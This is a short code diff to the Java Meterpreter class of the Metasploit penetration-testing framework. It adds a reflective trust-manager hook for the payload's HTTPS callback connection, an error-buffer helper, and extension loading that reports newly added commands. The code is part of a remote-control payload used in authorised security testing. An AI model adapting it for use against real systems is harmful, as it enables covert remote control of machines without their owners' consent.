@@ -167,6 +167,15 @@ public class Meterpreter {
 			TLVPacket request = null;
 			try {
 				URLConnection uc = url.openConnection();
+				if (url.getProtocol().equals("https")) {
+					// load the trust manager via reflection, to avoid loading
+					// it when it is not needed (it requires Sun Java 1.4+)
+					try {
+						Class.forName("com.metasploit.meterpreter.PayloadTrustManager").getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {uc});
+					} catch (Exception ex) {
+						ex.printStackTrace(getErrorStream());
+					}
+				}			
 				uc.setDoOutput(true);
 				OutputStream out = uc.getOutputStream();
 				out.write(outPacket == null ? RECV : outPacket);
@@ -268,6 +277,15 @@ public class Meterpreter {
 	}
 
 	/**
+	 * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.
+	 */
+	public int getErrorBufferLength() {
+		if (errBuffer == null)
+			return -1;
+		return errBuffer.size();
+	}
+	
+	/**
 	 * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.
 	 */
 	public byte[] getErrorBuffer() {
@@ -304,7 +322,7 @@ public class Meterpreter {
 	 * @param data
 	 *            The extension jar's content as a byte array
 	 */
-	public void loadExtension(byte[] data) throws Exception {
+	public String[] loadExtension(byte[] data) throws Exception {
 		ClassLoader classLoader = getClass().getClassLoader();
 		if (loadExtensions) {
 			URL url = MemoryBufferURLConnection.createURL(data, "application/jar");
@@ -313,6 +331,8 @@ public class Meterpreter {
 		JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));
 		String loaderName = (String) jis.getManifest().getMainAttributes().getValue("Extension-Loader");
 		ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();
+		commandManager.resetNewCommands();
 		loader.load(commandManager);
+		return commandManager.getNewCommands();
 	}
 }
